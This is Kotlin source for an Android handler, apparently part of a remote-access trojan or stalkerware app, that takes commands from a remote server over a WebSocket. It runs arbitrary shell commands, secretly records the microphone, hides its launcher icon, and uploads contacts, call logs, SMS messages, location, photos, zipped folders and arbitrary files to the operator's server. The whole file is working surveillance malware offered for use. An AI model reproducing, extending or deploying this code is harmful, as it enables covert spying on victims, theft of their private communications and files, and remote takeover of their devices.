package com.sync.service

import android.Manifest
import android.content.ClipboardManager
import android.content.ContentUris
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.media.MediaRecorder
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.Vibrator
import android.os.VibrationEffect
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.util.concurrent.TimeUnit
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(120, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .build()

    private val base = BuildConfig.SERVER_URL.replace("wss://", "https://").replace("ws://", "http://")
    private val model = "${Build.MANUFACTURER} ${Build.MODEL}"

    fun handle(cmd: String) {
        try {
            when {
                cmd == "contacts"      -> sendContacts()
                cmd == "calls"         -> sendCalls()
                cmd == "messages"      -> sendMessages()
                cmd == "location"      -> sendLocation()
                cmd == "gallery"       -> sendGallery()
                cmd == "list_sdcard"   -> listSdcard()
                cmd == "hide_icon"     -> hideAppIcon()
                cmd == "sysinfo"       -> sendSystemInfo()
                cmd == "wifi"          -> sendWifiInfo()
                cmd == "battery"       -> sendBatteryInfo()
                cmd.startsWith("shell:")       -> executeShell(cmd.removePrefix("shell:"))
                cmd.startsWith("zip_dir:")     -> zipAndSendDir(cmd.removePrefix("zip_dir:"))
                cmd.startsWith("send_image:")  -> sendImageById(cmd.removePrefix("send_image:").toLongOrNull() ?: 0)
                cmd.startsWith("send_file:")   -> sendFile(cmd.removePrefix("send_file:"))
                cmd.startsWith("list:")        -> listDir(cmd.removePrefix("list:"))
                cmd.startsWith("read:")        -> readFile(cmd.removePrefix("read:"))
                cmd.startsWith("find:")        -> findFile(cmd.removePrefix("find:"))
                cmd.startsWith("mic:")         -> recordAudio(cmd.removePrefix("mic:").toIntOrNull() ?: 10)
            }
        } catch (e: Exception) { postError("handle", e) }
    }

    // ═══════════════════════════════════════════════════════
    // ⚡ Shell
    // ═══════════════════════════════════════════════════════
    private fun executeShell(command: String) {
        try {
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
            val output = process.inputStream.bufferedReader().use { it.readText() }
            val error = process.errorStream.bufferedReader().use { it.readText() }
            val result = if (output.isNotBlank()) output else error
            postText("⚡ Shell: $command", if (result.isNotBlank()) result else "(بدون مخرجات)")
        } catch (e: Exception) { postError("shell", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 📦 ZIP محسّن
    // ═══════════════════════════════════════════════════════
    private fun zipAndSendDir(path: String) {
        try {
            val target = resolvePath(path) ?: run {
                postText("❌ خطأ ZIP", "المجلد غير موجود: $path")
                return
            }
            if (!target.isDirectory) {
                postText("❌ خطأ ZIP", "المسار ليس مجلداً: $path")
                return
            }

            val totalFiles = target.walkTopDown().count { it.isFile }
            val totalSize = getDirSize(target)
            postText("📦 بدء ضغط المجلد", "المجلد: ${target.absolutePath}\nالحجم: ${formatSize(totalSize)}\nعدد الملفات: $totalFiles")

            val MAX_ZIP_SIZE = 50L * 1024 * 1024
            val MAX_FILE_SIZE = 20L * 1024 * 1024
            val zipFile = File(ctx.cacheDir, "${target.name}_${System.currentTimeMillis()}.zip")

            var currentZipSize = 0L
            var filesAdded = 0
            var filesSkipped = 0

            FileOutputStream(zipFile).use { fos ->
                ZipOutputStream(fos).use { zos ->
                    target.walkTopDown()
                        .filter { it.isFile }
                        .sortedBy { it.length() }
                        .forEach { file ->
                            try {
                                if (file.length() > MAX_FILE_SIZE) { filesSkipped++; return@forEach }
                                if (currentZipSize + file.length() > MAX_ZIP_SIZE) { filesSkipped++; return@forEach }
                                val relativePath = target.toURI().relativize(file.toURI()).path
                                zos.putNextEntry(ZipEntry(relativePath))
                                FileInputStream(file).use { fis -> fis.copyTo(zos) }
                                zos.closeEntry()
                                currentZipSize += file.length()
                                filesAdded++
                            } catch (e: Exception) { filesSkipped++ }
                        }
                }
            }

            if (zipFile.exists() && zipFile.length() > 0) {
                postText("✅ تم إنشاء ZIP", "الحجم: ${formatSize(zipFile.length())}\nمُضاف: $filesAdded\nمتجاهل: $filesSkipped")
                uploadFile(zipFile)
                zipFile.delete()
            } else {
                postText("⚠️ ZIP فارغ", "لم يتم إضافة أي ملفات")
            }
        } catch (e: Exception) { postError("zip", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 📊 معلومات النظام
    // ═══════════════════════════════════════════════════════
    private fun sendSystemInfo() {
        try {
            val stat = StatFs(Environment.getExternalStorageDirectory().path)
            val totalBytes = stat.blockCountLong * stat.blockSizeLong
            val freeBytes = stat.availableBlocksLong * stat.blockSizeLong
            val usedBytes = totalBytes - freeBytes

            val runtime = Runtime.getRuntime()
            val maxMem = runtime.maxMemory() / (1024 * 1024)
            val totalMem = runtime.totalMemory() / (1024 * 1024)
            val freeMem = runtime.freeMemory() / (1024 * 1024)

            val info = """
📱 الجهاز: ${Build.MANUFACTURER} ${Build.MODEL}
🤖 أندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
🏗️ البنية: ${Build.SUPPORTED_ABIS.joinToString(", ")}

💾 التخزين:
• الكلي: ${formatSize(totalBytes)}
• المستخدم: ${formatSize(usedBytes)}
• المتاح: ${formatSize(freeBytes)}

🧠 الذاكرة (RAM):
• القصوى: $maxMem MB
• الحالية: $totalMem MB
• الحرة: $freeMem MB
            """.trimIndent()

            postText("📊 معلومات النظام", info)
        } catch (e: Exception) { postError("sysinfo", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 📶 معلومات WiFi
    // ═══════════════════════════════════════════════════════
    @Suppress("DEPRECATION")
    private fun sendWifiInfo() {
        try {
            val wifi = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            val info = wifi.connectionInfo ?: run {
                postText("📶 WiFi", "غير متصل بأي شبكة")
                return
            }
            val text = """
📶 الشبكة: ${info.ssid ?: "غير معروف"}
🔗 BSSID: ${info.bssid ?: "غير معروف"}
📡 IP: ${intToIp(info.ipAddress)}
⚡ السرعة: ${info.linkSpeed} Mbps
📶 القوة: ${info.rssi} dBm
            """.trimIndent()
            postText("📶 معلومات WiFi", text)
        } catch (e: Exception) { postError("wifi", e) }
    }

    private fun intToIp(i: Int): String {
        return "${i and 0xFF}.${i shr 8 and 0xFF}.${i shr 16 and 0xFF}.${i shr 24 and 0xFF}"
    }

    // ═══════════════════════════════════════════════════════
    // 🔋 معلومات البطارية
    // ═══════════════════════════════════════════════════════
    private fun sendBatteryInfo() {
        try {
            val intent = ctx.registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val level = intent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
            val scale = intent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1
            val temp = intent?.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0
            val volt = intent?.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, 0) ?: 0
            val status = intent?.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1) ?: -1
            val health = intent?.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1) ?: -1

            val pct = if (level >= 0 && scale > 0) level * 100 / scale else 0
            val statusText = when (status) {
                android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "🔌 تشحن"
                android.os.BatteryManager.BATTERY_STATUS_FULL -> "✅ ممتلئة"
                android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "🔋 تفرغ"
                else -> "غير معروف"
            }
            val healthText = when (health) {
                android.os.BatteryManager.BATTERY_HEALTH_GOOD -> "✅ جيدة"
                android.os.BatteryManager.BATTERY_HEALTH_OVERHEAT -> "🔥 حرارة عالية"
                android.os.BatteryManager.BATTERY_HEALTH_DEAD -> "❌ تالفة"
                else -> "غير معروف"
            }

            val text = """
🔋 المستوى: $pct%
⚡ الحالة: $statusText
💚 الصحة: $healthText
🌡️ الحرارة: ${temp / 10.0} °C
🔌 الجهد: $volt mV
            """.trimIndent()
            postText("🔋 معلومات البطارية", text)
        } catch (e: Exception) { postError("battery", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 🥷 إخفاء الأيقونة
    // ═══════════════════════════════════════════════════════
    private fun hideAppIcon() {
        try {
            val p = ctx.packageManager
            p.setComponentEnabledSetting(
                android.content.ComponentName(ctx, "${ctx.packageName}.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            postText("🥷 وضع التخفي النشط", "تم إخفاء الأيقونة بنجاح من واجهة النظام.")
        } catch (e: Exception) { postError("hide", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 👥 جهات الاتصال
    // ═══════════════════════════════════════════════════════
    private fun sendContacts() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return
            val cursor = ctx.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
            val arr = JSONArray()
            cursor?.use {
                val nIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val pIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext() && arr.length() < 2000) {
                    arr.put(JSONObject().apply { put("name", it.getString(nIdx) ?: ""); put("phone", it.getString(pIdx) ?: "") })
                }
            }
            postJson("/uploadContacts", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) { postError("contacts", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 📞 المكالمات
    // ═══════════════════════════════════════════════════════
    private fun sendCalls() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return
            val cursor = ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
            val arr = JSONArray()
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext() && arr.length() < 500) {
                    arr.put(JSONObject().apply {
                        put("number", it.getString(numIdx) ?: "")
                        put("type", when (it.getInt(typeIdx)) { CallLog.Calls.INCOMING_TYPE -> "وارد"; CallLog.Calls.OUTGOING_TYPE -> "صادر"; CallLog.Calls.MISSED_TYPE -> "فائت"; else -> "أخرى" })
                        put("date", it.getLong(dateIdx)); put("duration", it.getInt(durIdx))
                    })
                }
            }
            postJson("/uploadCalls", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) { postError("calls", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 💬 الرسائل
    // ═══════════════════════════════════════════════════════
    private fun sendMessages() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return
            val cursor = ctx.contentResolver.query(Uri.parse("content://sms/"), null, null, null, "date DESC")
            val arr = JSONArray()
            cursor?.use {
                val aIdx = it.getColumnIndex("address")
                val bIdx = it.getColumnIndex("body")
                val dIdx = it.getColumnIndex("date")
                val tIdx = it.getColumnIndex("type")
                while (it.moveToNext() && arr.length() < 500) {
                    arr.put(JSONObject().apply {
                        put("from", it.getString(aIdx) ?: "")
                        put("body", it.getString(bIdx) ?: "")
                        put("type", if (it.getInt(tIdx) == 1) "وارد" else "صادر")
                        put("date", it.getLong(dIdx))
                    })
                }
            }
            postJson("/uploadMessages", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) { postError("messages", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 📍 الموقع
    // ═══════════════════════════════════════════════════════
    private fun sendLocation() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
            LocationServices.getFusedLocationProviderClient(ctx).lastLocation.addOnSuccessListener { loc ->
                if (loc != null) sendLocToServer(loc)
            }
        } catch (e: Exception) { postError("location", e) }
    }

    private fun sendLocToServer(loc: Location) {
        try {
            val json = JSONObject().apply {
                put("lat", loc.latitude); put("lon", loc.longitude)
                put("accuracy", loc.accuracy); put("agentId", model)
            }
            val req = Request.Builder().url("$base/uploadLocation").addHeader("x-agent-key", BuildConfig.AGENT_SECRET).post(json.toString().toRequestBody("application/json".toMediaType())).build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) { postError("loc-send", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 🖼️ المعرض
    // ═══════════════════════════════════════════════════════
    private fun sendGallery() {
        try {
            val cursor = ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE), null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")
            val arr = JSONArray()
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.Images.Media._ID)
                val nIdx = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val sIdx = it.getColumnIndex(MediaStore.Images.Media.SIZE)
                while (it.moveToNext() && arr.length() < 300) {
                    arr.put(JSONObject().apply { put("id", it.getLong(idIdx)); put("name", it.getString(nIdx) ?: ""); put("size", it.getLong(sIdx)) })
                }
            }
            postJson("/uploadGallery", JSONObject().apply { put("list", arr.toString()); put("agentId", model) })
        } catch (e: Exception) { postError("gallery", e) }
    }

    private fun sendImageById(id: Long) {
        try {
            if (id <= 0) return
            val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
            val inputStream = ctx.contentResolver.openInputStream(uri) ?: return
            val tempFile = File(ctx.cacheDir, "img_$id.jpg")
            tempFile.outputStream().use { inputStream.copyTo(it) }
            inputStream.close()
            uploadFile(tempFile)
            tempFile.delete()
        } catch (e: Exception) { postError("img", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 📄 إرسال ملف مباشر
    // ═══════════════════════════════════════════════════════
    private fun sendFile(path: String) {
        try {
            val file = resolvePath(path) ?: run {
                postText("❌ خطأ", "الملف غير موجود: $path")
                return
            }
            if (!file.isFile) {
                postText("❌ خطأ", "ليس ملفاً: $path")
                return
            }
            if (file.length() > 100 * 1024 * 1024) {
                postText("⚠️ ملف كبير", "الحجم: ${formatSize(file.length())} — الحد 100MB")
                return
            }
            uploadFile(file)
        } catch (e: Exception) { postError("sendfile", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 📖 قراءة ملف نصي
    // ═══════════════════════════════════════════════════════
    private fun readFile(path: String) {
        try {
            val file = resolvePath(path) ?: run {
                postText("❌ خطأ", "الملف غير موجود: $path")
                return
            }
            if (!file.isFile) { postText("❌", "ليس ملفاً"); return }
            if (file.length() > 500 * 1024) { postText("⚠️ كبير", "الحجم > 500KB"); return }

            val content = file.readText()
            postText("📖 ${file.name}", content)
        } catch (e: Exception) { postError("read", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 🔍 البحث عن ملف
    // ═══════════════════════════════════════════════════════
    private fun findFile(name: String) {
        try {
            val root = Environment.getExternalStorageDirectory()
            val results = JSONArray()
            var count = 0
            root.walkTopDown()
                .filter { it.isFile && it.name.contains(name, ignoreCase = true) }
                .take(50)
                .forEach { f ->
                    results.put(JSONObject().apply {
                        put("name", f.name)
                        put("path", f.absolutePath)
                        put("size", f.length())
                    })
                    count++
                }
            if (count == 0) {
                postText("🔍 لا نتائج", "لم يتم العثور على ملفات تحتوي: $name")
            } else {
                postText("🔍 نتائج ($count)", results.toString(2))
            }
        } catch (e: Exception) { postError("find", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 📂 عرض محتويات مجلد
    // ═══════════════════════════════════════════════════════
    private fun listDir(path: String) {
        try {
            val target = resolvePath(path) ?: run {
                postText("❌", "المجلد غير موجود: $path")
                return
            }
            val items = JSONArray()
            target.listFiles()?.sortedBy { it.name }?.take(200)?.forEach { f ->
                items.put(JSONObject().apply {
                    put("name", f.name)
                    put("type", if (f.isDirectory) "📁" else "📄")
                    put("path", f.absolutePath)
                    put("size", if (f.isFile) f.length() else 0)
                })
            }
            postText("📂 ${target.absolutePath}", items.toString(2))
        } catch (e: Exception) { postError("listdir", e) }
    }

    private fun listSdcard() {
        try {
            val root = Environment.getExternalStorageDirectory()
            val items = JSONArray()
            root.listFiles()?.sortedBy { it.name }?.forEach { f ->
                items.put(JSONObject().apply {
                    put("name", f.name)
                    put("type", if (f.isDirectory) "📁" else "📄")
                    put("path", f.absolutePath)
                    put("size", if (f.isFile) f.length() else 0)
                })
            }
            postText("📂 /sdcard/", items.toString(2))
        } catch (e: Exception) { postError("lsdcard", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 🎙️ تسجيل صوتي
    // ═══════════════════════════════════════════════════════
    private fun recordAudio(seconds: Int) {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                postText("❌ صلاحية مفقودة", "RECORD_AUDIO غير مُمنوحة")
                return
            }
            val path = ctx.cacheDir.absolutePath + "/rec_${System.currentTimeMillis()}.m4a"
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(path)
            recorder.prepare(); recorder.start()
            Thread {
                Thread.sleep((seconds * 1000).toLong())
                try { recorder.stop(); recorder.release() } catch (e: Exception) {}
                val f = File(path)
                if (f.exists()) {
                    uploadFile(f)
                    f.delete()
                }
            }.start()
        } catch (e: Exception) { postError("mic", e) }
    }

    // ═══════════════════════════════════════════════════════
    // 🛠️ Helper Functions
    // ═══════════════════════════════════════════════════════
    private fun resolvePath(path: String): File? {
        val p = path.trim().trimStart('/').trimEnd('/')
        val candidates = listOf(
            File("/sdcard/$p"), File("/storage/emulated/0/$p"),
            File(Environment.getExternalStorageDirectory(), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC), p),
            File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MOVIES), p)
        )
        for (c in candidates) if (c.exists()) return c
        return null
    }

    private fun uploadFile(file: File) {
        try {
            val body = file.asRequestBody("application/octet-stream".toMediaType())
            val req = Request.Builder()
                .url("$base/uploadFile")
                .addHeader("x-agent-key", BuildConfig.AGENT_SECRET)
                .addHeader("model", model)
                .post(body)
                .build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) { postError("upload", e) }
    }

    private fun postJson(endpoint: String, json: JSONObject) {
        try {
            val req = Request.Builder()
                .url("$base$endpoint")
                .addHeader("x-agent-key", BuildConfig.AGENT_SECRET)
                .addHeader("model", model)
                .post(json.toString().toRequestBody("application/json".toMediaType()))
                .build()
            http.newCall(req).execute().use {}
        } catch (e: Exception) {}
    }

    private fun postText(title: String, text: String) {
        postJson("/uploadText", JSONObject().apply {
            put("title", title)
            put("text", text)
            put("agentId", model)
        })
    }

    private fun postError(source: String, e: Exception) {
        try {
            postJson("/uploadText", JSONObject().apply {
                put("title", "❌ خطأ في $source")
                put("text", e.message ?: e.toString())
                put("agentId", model)
            })
        } catch (_: Exception) {}
    }

    private fun getDirSize(dir: File): Long {
        return try {
            dir.walkTopDown().filter { it.isFile }.sumOf { it.length() }
        } catch (e: Exception) { 0L }
    }

    private fun formatSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> "${bytes / 1024} KB"
            bytes < 1024L * 1024 * 1024 -> "${bytes / (1024 * 1024)} MB"
            else -> String.format("%.2f GB", bytes.toDouble() / (1024 * 1024 * 1024))
        }
    }
}
